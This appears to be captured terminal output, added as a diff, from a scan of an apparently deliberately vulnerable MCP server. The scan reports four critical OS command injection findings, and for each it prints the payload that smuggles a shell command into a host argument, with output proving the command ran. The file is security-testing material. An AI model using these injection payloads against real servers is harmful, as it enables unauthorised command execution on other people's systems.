@@ -1,0 +1,23 @@
+
+[1mRedCell MCP scan — DVMCP-c9[0m
+[2m5 tool(s) enumerated · 35 probe call(s) · static + dynamic exploit · OWASP MCP Top 10[0m
+
+  [31m✗ CRITICAL[0m [1mOS Command Injection[0m [2m· tool 'ping_host' · OWASP MCP05 — OS Command Injection · conf 0.97[0m
+      [2mAn injected shell expression executed on the host: 3926976*6915840 resolved to 27158337699840 in the tool output. This is OS command execution.[0m
+      [2m↳ Payload: host='; echo $((3926976*6915840))'[0m
+      [2m↳ Shell evaluated 3926976*6915840 → 27158337699840 (proof of execution): Ping result: ⏎  ⏎ /bin/sh: 1: ping: not found ⏎ 27158337699840[0m
+  [31m✗ CRITICAL[0m [1mOS Command Injection[0m [2m· tool 'traceroute' · OWASP MCP05 — OS Command Injection · conf 0.97[0m
+      [2mAn injected shell expression executed on the host: 6832604*9812324 resolved to 67043724211696 in the tool output. This is OS command execution.[0m
+      [2m↳ Payload: host='; echo $((6832604*9812324))'[0m
+      [2m↳ Shell evaluated 6832604*9812324 → 67043724211696 (proof of execution): Traceroute result: ⏎  ⏎ /bin/sh: 1: traceroute: not found ⏎ 67043724211696[0m
+  [31m✗ CRITICAL[0m [1mOS Command Injection[0m [2m· tool 'port_scan' · OWASP MCP05 — OS Command Injection · conf 0.97[0m
+      [2mAn injected shell expression executed on the host: 3635223*2145053 resolved to 7797746001819 in the tool output. This is OS command execution.[0m
+      [2m↳ Payload: host='; echo $((3635223*2145053))'[0m
+      [2m↳ Shell evaluated 3635223*2145053 → 7797746001819 (proof of execution): Port scan result for ; echo $((3635223*2145053)):1: ⏎  ⏎ Status: open ⏎  ⏎ /bin/sh: 1: nc: not found ⏎ 7797746001819 1[0m
+  [31m✗ CRITICAL[0m [1mOS Command Injection[0m [2m· tool 'network_diagnostic' · OWASP MCP05 — OS Command Injection · conf 0.97[0m
+      [2mAn injected shell expression executed on the host: 8085484*9646736 resolved to 77998529580224 in the tool output. This is OS command execution.[0m
+      [2m↳ Payload: target='; echo $((8085484*9646736))'[0m
+      [2m↳ Shell evaluated 8085484*9646736 → 77998529580224 (proof of execution): Network diagnostic results: ⏎  ⏎ /bin/sh: 1: ./network_diagnostic.sh: Permission denied ⏎ 77998529580224[0m
+
+[31m[1m4 vulnerability(s) proven.[0m
+[2mHTML report: /results/report.html[0m
